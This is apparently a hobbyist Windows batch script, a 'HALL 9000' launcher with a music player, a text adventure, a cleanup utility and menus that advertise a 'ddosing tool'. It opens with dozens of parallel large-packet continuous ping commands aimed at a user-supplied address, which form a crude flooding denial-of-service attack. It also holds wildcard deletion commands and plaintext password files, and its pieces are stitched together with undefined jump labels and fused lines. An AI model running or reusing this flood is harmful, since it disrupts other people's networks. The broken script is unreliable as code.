start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000

set /p gitrekt=
if %gitrekt%== nooo goto delete

:delete
color 0D
echo.
echo ok,chow!!!
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto random

:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto werdy 
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%  %random%
goto random

:b2
echo bye
set /p b21=
if %b21%== bye goto cls
echo
echo
echo
cls

:cls123
cls
pause

:cls
cls

:adminacc
echo.
echo ========================================
echo H A L L 9 0 0 0   P R O    E D I T I O N
echo ========================================
echo administrator privilege active
echo please insert a command number
echo standard mode (1)
echo advanced mode (2)
set /p enter1=ENTER:
if %enter1%== 1 goto hl9k
if %enter1%== 2 goto advancedmd

:advancedmd
title PC Cleanup Utility http://www.youtube.com/user/techki-tv
goto menu2
:menu2
cls
echo --------------------------------------------------------------------------------
echo PC Cleanup Utility
echo --------------------------------------------------------------------------------
echo.
echo Select a tool
echo =============
echo.
echo [1] Delete Internet Cookies
echo [2] Delete Temporary Internet Files
echo [3] Disk Cleanup
echo [4] Disk Defragment
echo [5] Exit
echo.
set /p op=Run:
if %op%==1 goto 1
if %op%==2 goto 2
if %op%==3 goto 3
if %op%==4 goto 4
if %op%==5 goto exit
goto error
:1
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Deleting Cookies...
ping localhost -n 3 >nul
del /f /q "%userprofile%\Cookies\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Cookies deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu2

:2
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Deleting Temporary Files...
ping localhost -n 3 >nul
del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Temporary Internet Files deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu2

:3
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Running Disk Cleanup...
ping localhost -n 3 >nul
if exist "C:\WINDOWS\temp"del /f /q "C:WINDOWS\temp\*.*"
if exist "C:\WINDOWS\tmp" del /f /q "C:\WINDOWS\tmp\*.*"
if exist "C:\tmp" del /f /q "C:\tmp\*.*"
if exist "C:\temp" del /f /q "C:\temp\*.*"
if exist "%temp%" del /f /q "%temp%\*.*"
if exist "%tmp%" del /f /q "%tmp%\*.*"
if not exist "C:\WINDOWS\Users\*.*" goto skip
if exist "C:\WINDOWS\Users\*.zip" del "C:\WINDOWS\Users\*.zip" /f /q
if exist "C:\WINDOWS\Users\*.exe" del "C:\WINDOWS\Users\*.exe" /f /q
if exist "C:\WINDOWS\Users\*.gif" del "C:\WINDOWS\Users\*.gif" /f /q
if exist "C:\WINDOWS\Users\*.jpg" del "C:\WINDOWS\Users\*.jpg" /f /q
if exist "C:\WINDOWS\Users\*.png" del "C:\WINDOWS\Users\*.png" /f /q
if exist "C:\WINDOWS\Users\*.bmp" del "C:\WINDOWS\Users\*.bmp" /f /q
if exist "C:\WINDOWS\Users\*.avi" del "C:\WINDOWS\Users\*.avi" /f /q
if exist "C:\WINDOWS\Users\*.mpg" del "C:\WINDOWS\Users\*.mpg" /f /q
if exist "C:\WINDOWS\Users\*.mpeg" del "C:\WINDOWS\Users\*.mpeg" /f /q
if exist "C:\WINDOWS\Users\*.ra" del "C:\WINDOWS\Users\*.ra" /f /q
if exist "C:\WINDOWS\Users\*.ram" del "C:\WINDOWS\Users\*.ram"/f /q
if exist "C:\WINDOWS\Users\*.mp3" del "C:\WINDOWS\Users\*.mp3" /f /q
if exist "C:\WINDOWS\Users\*.mov" del "C:\WINDOWS\Users\*.mov" /f /q
if exist "C:\WINDOWS\Users\*.qt" del "C:\WINDOWS\Users\*.qt" /f /q
if exist "C:\WINDOWS\Users\*.asf" del "C:\WINDOWS\Users\*.asf" /f /q

:skip
if not exist C:\WINDOWS\Users\Users\*.* goto skippy /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.zip del C:\WINDOWS\Users\Users\*.zip /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.exe del C:\WINDOWS\Users\Users\*.exe /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.gif del C:\WINDOWS\Users\Users\*.gif /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.jpg del C:\WINDOWS\Users\Users\*.jpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.png del C:\WINDOWS\Users\Users\*.png /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.bmp del C:\WINDOWS\Users\Users\*.bmp /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.avi del C:\WINDOWS\Users\Users\*.avi /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpg del C:\WINDOWS\Users\Users\*.mpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpeg del C:\WINDOWS\Users\Users\*.mpeg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ra del C:\WINDOWS\Users\Users\*.ra /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ram del C:\WINDOWS\Users\Users\*.ram /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mp3 del C:\WINDOWS\Users\Users\*.mp3 /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.asf del C:\WINDOWS\Users\Users\*.asf /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.qt del C:\WINDOWS\Users\Users\*.qt /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mov del C:\WINDOWS\Users\Users\*.mov /f /q

:skippy
if exist "C:\WINDOWS\ff*.tmp" del C:\WINDOWS\ff*.tmp /f /q
if exist C:\WINDOWS\ShellIconCache del /f /q "C:\WINDOWS\ShellI~1\*.*"
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Disk Cleanup successful!
echo.
pause
goto menu2

:4
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Defragmenting hard disks...
ping localhost -n 3 >nul
defrag -c -v
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Disk Defrag successful!
echo.
pause
goto menu2

:error
cls
echo Command not recognized.
ping localhost -n 4 >nul
goto menu2

:exit2
echo Thanks for using PC Cleanup Utility by Ryan
echo all credits reserved to Ryan
ping 127.0.0.1 >nul@echo off

:start1
echo.
cls 
echo Loading.. 
ping localhost -n 2 >nul 
cls 
echo Loading... 
ping localhost -n 2 >nul 
cls 
echo Connected 
echo =======================
echo   W  E  L  C  O  M  E
echo =======================
echo login         (1)
echo register      (2)
echo administrator (3)
echo continue      (4)
echo exit          (5)
set /p userin1=ENTER:
if %userin1%== 1 goto begin1
if %userin1%== 2 goto newuser
if %userin1%== 3 goto login2
if %userin1%== 5 goto exit 
if %userin1%== 4 goto hl9ks
goto start1

:newuser2
set /p userin4=Please insert your Username:
set /p userin5=Please enter your Password:
echo %userin4%>ficou.txt
echo %userin5%>ficop.txt
cls

:login2
set /p userin6=<ficou.txt
set /p userin7=<ficop.txt
set /p userin8=Username:
set /p userin9=Password:
if %userin8%==%userin6% goto password2
if not %userin8%==%userin6% goto begin1
:password2
if %userin9%==%userin7% goto adminacc
if not %userin9%==%userin7% goto begin1

:newuser
set /p userin4=Please insert your Username:
set /p userin5=Please enter your Password:
echo %userin4%>username.txt
echo %userin5%>password.txt
goto begin1

:begin1
set /p userin2=<username.txt
set /p userin3=<password.txt
set /p userin4=Username:
set /p userin5=Password:
if %userin4%==%userin2% goto password
if not %userin4%==%userin2% goto begin1
:password
if %userin5%==%userin3% goto begin2
if not %userin5%==%userin3% goto begin1

:begin2
cls
echo ===============================
echo   WELCOME %userin4% WELCOME
echo ===============================
echo.
echo choose command:
echo continue  (1)
echo customise (2)
echo exit      (3)
set /p cmd=ENTER:
if %cmd%== 1 goto hl9k
if %cmd%== 2 goto colorhl9k
if %cmd%== 3 goto exit
goto begin2

:colorhl9k
pause
echo please instert the number of the color you want
echo blue   (1)
echo green  (2)
echo yellow (3)
echo purple (4)
echo red    (5)
set /p clrchs=ENTER:
if %clrchs%== 1 goto hl9kB
if %clrchs%== 2 goto hl9kG
if %clrchs%== 3 goto hl9kY
if %clrchs%== 4 goto hl9kP
if %clrchs%== 5 goto hl9kR
goto colorhl9k
 
:hl9ks
pause
echo
echo ==================================
echo   H A L L 9 0 0 0   S I M P L E
echo ==================================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1) music-provides a music player                             
echo (2) skype-opens skype
echo (3) chrome-opens google.com
echo (4) steam-opens steam
echo (5) viber-opens viber
set /p com=command:
if "%com%"=="2" goto skype1
if "%com%"=="3" goto chrome1
if "%com%"=="4" goto steam1
if "%com%"=="5" goto viber1
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9ks
 
:hl9kB
pause
color 03
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam and game launcher
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kB

:hl9kG
pause
color 02
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kG

:hl9kR
pause
color 04
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:      
echo type in "exit" to exit the application
echo type in "back" to go back to login screen 
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kR

:hl9kY
pause
color 06
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kY

:hl9kP
pause
color 05
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kP
 
:hl9k
pause
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9k







































:musicplayer
echo.
echo please insert the number of the song you want
echo back-(back)
echo exit-(exit)
echo tales from the borderlands-kiss the sky     (1)
echo tales from the borderlands-my silver lining (2)
echo ed sheeran-castle on the hill               (3)
echo ed sheeran-shape of you                     (4)
echo sia-move your body                          (5)
echo david guetta ft. sia-beautiful people say   (6)
echo david guetta-would i lie to you             (7)
echo carnage ft. timmy trumpet-toca bass boosted (8)
echo rocket league-seeing whats next             (9)
echo rocket league-we speak chinese              (10)
echo rocket league-solar eclipse                 (11)
echo the last of us 2-through the valley         (12)
echo alessia cara-scars to your beautiful        (13)
echo rag'n'bone man-human                        (14)
set /p mc=ENTER:
if %mc%== 1 goto m1
if %mc%== 2 goto m2
if %mc%== 3 goto m3
if %mc%== 4 goto m4
if %mc%== 5 goto m5
if %mc%== 6 goto m6
if %mc%== 7 goto m7
if %mc%== 8 goto m8
if %mc%== 9 goto m9
if %mc%== 10 goto m10
if %mc%== 11 goto m11
if %mc%== 12 goto m12
if %mc%== 13 goto m13
if %mc%== 14 goto m14
if %mc%== exit goto exit
if %mc%== back goto hl9k

:m1
start C:\Users\"fico pico"\Music\music\"Tales from the borderlands episode 2 intro song-Shawn Lee's Ping Pong Orchestra feat. Nino Mochella - Kiss The Sky.mp3"
pause
goto musicplayer
:m2
start C:\Users\"fico pico"\Music\music\"Tales From The Borderlands Episode 5 End Credits Song (My Silver Lining).mp3"
pause
goto musicplayer
:m3
start C:\Users\"fico pico"\Music\music\"Ed Sheeran - Castle On The Hill Official Lyric Video (1).mp3"
pause
goto musicplayer
:m4
start C:\Users\"fico pico"\Music\music\"Ed Sheeran - Shape Of You Official Lyric Video.mp3"
pause
goto musicplayer
:m5
start C:\Users\"fico pico"\Music\music\"Sia - Move Your Body (Alan Walker Remix) Audio.mp3"
pause
goto musicplayer
:m6
start C:\Users\"fico pico"\Music\music\"David Guetta - Beautiful People Say ft. Sia Lyrics (1).mp3"
pause
goto musicplayer
:m7
start C:\Users\"fico pico"\Music\music\"David Guetta_ Cedric Gervais & Chris Willis - Would I Lie To You (Lyric Video) (1).mp3"
pause
goto musicplayer
:m8
start C:\Users\"fico pico"\Music\music\"Carnage feat. Timmy Trumpet & KSHMR - Toca Bass Boosted (1).mp3"
pause
goto musicplayer
:m9
start C:\Users\"fico pico"\Music\music\"Seeing What's Next.mp3"
pause
goto musicplayer
:m11
start C:\Users\"fico pico"\Music\music\"Rocket League Music Solar eclipse.mp3"
pause
goto musicplayer
:m10
start C:\Users\"fico pico"\Music\music\"We speak Chinese-Rocket League OST.mp3"
pause
goto musicplayer
:m12
start C:\Users\"fico pico"\Music\music\"The Last Of Us Part II-Ashley Johnson (Ellie) - Through The Valley Extended Version.mp3"
pause
goto musicplayer
:m13
start C:\Users\"fico pico"\Music\music\"Alessia Cara - Scars To Your Beautiful (Audio).mp3"
pause
goto musicplayer
:m14
start C:\Users\"fico pico"\Music\music\"Rag'n'Bone Man - Human (Rudimental Remix) Official Video.mp3"
pause
goto musicplayer

:menu
echo.
cls 
echo Loading.. 
ping localhost -n 2 >nul 
cls 
echo Loading... 
ping localhost -n 2 >nul 
cls 
echo Connected 
pause
echo welcome to The Advanture
echo begin (1)
echo exit  (2)
set /p menu=ENTER:
if %menu%== 1 goto home
if %menu%== 2 goto exit

:home
cls
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2 >nul
echo complete
cls
pause
echo.
echo -------------------------------------------------
echo       !W    E    L    C    O    M    E!
echo -------------------------------------------------
echo start     (1)
echo exit      (2)
echo settings  (3)
set /p chose=
if %chose%== 1 goto begin
if %chose%== 2 goto exit
if %chose%== 3 goto colors

:exit
exit

:colors
echo ----------------------------------------------------
echo        S    E    T    T    I    N    G    S
echo ----------------------------------------------------
echo please type in the color of your choosing
set /p clr=BLUE,RED,YELLOW,GREEN,PURPLE:
if %clr%== blue goto beginB
if %clr%== red goto beginR
if %clr%== yellow goto beginY
if %clr%== green goto beginG
if %clr%== purple goto beginP

:begin
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginB
color 03
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginR
color 04
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginG
color 02
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginY
color 06
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto encounter
if %chs%== 3 goto exit

:beginP
color 05
echo ----------------------------------------------------
echo       T  H  E     A  D  V  E  N  T  U  R  E
echo ----------------------------------------------------
echo tutorial      (1)
echo skip tutorial (2)
echo exit          (3)
set /p chs=
if %chs%== 1 goto tutorial
if %chs%== 2 goto prologue
if %chs%== 3 goto exit

:tutorial
echo the controls for this game are simple
echo when asked where to go type in the direction you want to go in
echo you can choose any direction but you cant go back
echo example:forward\left\right
echo as for fighting you use the numbers on your keyboard
echo example:attack1--key "1"
echo when your ready continue
echo continue (1)
echo exit     (2)
set /p chs2=
if %chs2%== 1 goto prolouge
if %chs2%== 2 goto exit

:prolouge
echo.
echo Narator:Hello,i am the narator
echo Narator:I will be guiding you through this "amaechoing" advanture
echo Narator:whell if it was amaechoing than it would have been text based 
echo Narator:never mind,you have been put in a scenario where you save the...world..
echo Narator:really...really!
echo Narator:Thats the best this fuck could do,i mean come on,again,a end of the world scenarion
echo Narator:Im out of here!
echo Narator:NARATOR Out!
echo type in start to whell...start
set /p chs3=
if %chs3%== start goto encounter
goto prologue
 
:encounter
 
                                 `                  
echo                             .+yhs:                
echo                          .+yhhhhhhh+-             
echo                       `/yhhhhhhhhhhhhy/`          
echo                    `/shhhhhhhhhhhhhhhhhhs:`       
echo                  :sddhhhhhhhhhhhhhhhhhhhhhh+-     
echo               -ohdoohdddhhhhhhhhhhhhhhhhhhhhhy/`  
echo            `/yds:.--.:sdddhhhhhhhhhhhhhhhhhhddd:  
echo          :sdy/` +soos/ `/ydddhhhhhhhhhhhhddddo:   
echo       .ohho.    /soos:    .+hddhhhhhhhddddy/:     
echo    `/yds:`       `..`        :sdddhhdddyooo:+.    
echo   `dyo` --:-:-.        .-:-:-- `oymdho///oyhhhy/  
echo    . :  /:+:+-:        :-+:/:/  : o++/+:-yhhhhhh- 
echo    :o+  oo::+/:        /++:/++  : ++yyhsohhhhhhho 
echo    ohho ./:+//:/        /://+:+` -`+hhhhhhhhhhhhho 
echo   :hhho `......`        .......  - yhhhhhhdhhhhhh+ 
echo   +hhho        :---::---:        -`hhhhhhhhhhhhhh- 
echo   +hhh+        +::://:::+        :`hhhhhhhhhhhhhy  
echo   /hhh+        +::://:::+        : yhhhhhhdhhhhh/  
echo   -hhh+        +::+o+/::+        : ohhhhhh/.-:-.   
echo    yhh+        +::://:::+        :.+hhhhhy`        
echo    :+oo------.-+::://:::+-----...+--/+o++-         
echo      .........----------........-   


echo          what a wonderfull day...
echo          lets go to work.
set /p drc=direction:
if %drc%==forwad goto work
if %drc%==left goto work
if %drc%==right goto work 

:work
echo.
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2>nul
cls
pause
echo ....`                                                     
echo              .+-/.--://--                                                 
echo              /..-::::::.+.                                                
echo              `+::-.``..-+                                                 
echo               +   ....+.                                                  
echo               +       .:                                                  
echo               +        +                                                  
echo              `/        o                                                  
echo              :.        o                                                  
echo              +         o`                                                 
echo              +         :-                                                 
echo              +         ./ ...-.`                                     .    
echo             `/          o-/-/-.o       .-:`   .::`  `-:/`  `::    .::-:`  
echo -.          s:- :  +-------`  -/::.  :/:-   :/:-  ::::`   `+: 
echo      `/+:-.-.+`         o .---++/:    -/+`   -/+`  `/+-    ::/`   -:-// / 
echo     :: -:-.--+:--.-----:.   ./.  .+`-/.  :-`/.  /-::  ./`::   /--:.+:`  / 
echo .+`o-.....--------......./....../:-----:/--:::/:::::://:::/:o-:-.    / 
echo    o  ++-------.....+    .------`   `o---------..............:-/``      + 
echo +``++.```````````s:://:---   .-. `+.......................--: `.... :- 
echo    o  +----------:/:`        -:`  `:.+-----------------------:.:---..-:o  
echo    o  +         /:             ::   /`    `+/:` :/:-`          :`//---``: 
echo    o``+       `+`               `/   +   `/`//`-/`o:`      ..` :`+:+/// + 
echo    o `+       +      `---..`     `+  -/``+ /...+`-:.-----.+:.s.:`/::/o:-- 
echo   `+.`+      +`    ::.  : `-:.    .:/....o -/::s``o---------:` : .+-:---  
echo /--   +      o   `+`    -    ::    /`-+:.o `/` :. +            : :-       
echo :-     +      o   +   --`-`--  +`   /  `: :. /  -- +            -/.        
echo ./     +     `+  `/   .- - -.  -:   /  .+-// o::/+.o------------:`         
echo .-----:::::::o..//....../---..:o---o//.   .-`    `                        
echo              ```````````````````````
echo. 
echo You:whell that was a nother day of work i guess...
echo You:bye everyone.
pause
goto apocolipse

:apocolipse
echo              .:syhhy:       
echo              ohysyooh+       
echo              `y+/+-+s`       
echo               .:/+::-        
echo :/+/:-`        `:s/-+//-`      
echo./smmmds     :/y/o//y+:/.     
echo   +sms/+..-:+:+---oo++-:-    
echo    :s//y:::++/o---os -o+/    
echo              ::--:hy/ .+/`   
echo              /ysoysy+  `::-. 
echo              odddddh   :/+s+ 
echo             :hhdhhhho    ..  
echo            .hhddsdhhh:       
echo            yhhdy .hhhd-      
echo           `hhdh+  .hhhd+     
echo            shddh+  .dhhd+    
echo            .hhhdh-  /dhhdy   
echo             :dddd:   yddds   
echo           :mmmNmd    oNNNy   
echo           -oo++-     smmdd-

echo     GIVE ME YOUR MONEY!
echo give money (1)
echo fight      (2)
set /p thg=ENTER:
if %thg%== 1 goto pussy1
if %thg%== 2 goto fight1

:pussy1
echo You:ok,ok...here you go,just dont hurt me...pls...
set /p drc1=DIRECTION:
if %drc1%==forward goto home1
if %drc1%==left goto home1
if %drc1%==right goto home1

:home1
echo.
echo whell that was a bad decision
echo i guess you cant go on the advanture now
echo bye you fuck
pause
goto exit

:fight1
cls
echo attack    (1)
echo pussy out (2)
set /p atc=ENTER:
if %atc%== 1 goto attack1
if %atc%== 2 goto pussy1
goto fight1

:attack1
cls
echo. 
echo Narator:You punched him in the balls as he screamed and ran away
echo Narator:you proudly went home with your money
echo.
echo Oh hey,im back btw.
echo explenation (1)
echo continue    (2)
set /p chs4=
if %chs4%== 1 goto explenation1
if %chs4%== 2 goto home1

:explenation1
echo.
echo Narator:whell you see...
echo Narator:i wasnt really allowed to go away
echo Narator:i kind of signed a contract
echo Narator:so i had to stay
echo Narator:never mind me,lets continue with the story
set /p chs5=Continue (Y/N):
if %chs5%== Y goto obduction
if %chs5%== N goto exit
goto explenation1

:obduction 
pause
echo.
echo                                                             
echo                                                                           
echo                                                                           
echo                               ```        `` `                             
echo                              `.```.`  `....::````                         
echo                         `         `---:.```````````                       
echo                       ``        ``//--/o-```````````                      
echo                      ``  ````````:sooo/so````````````                     
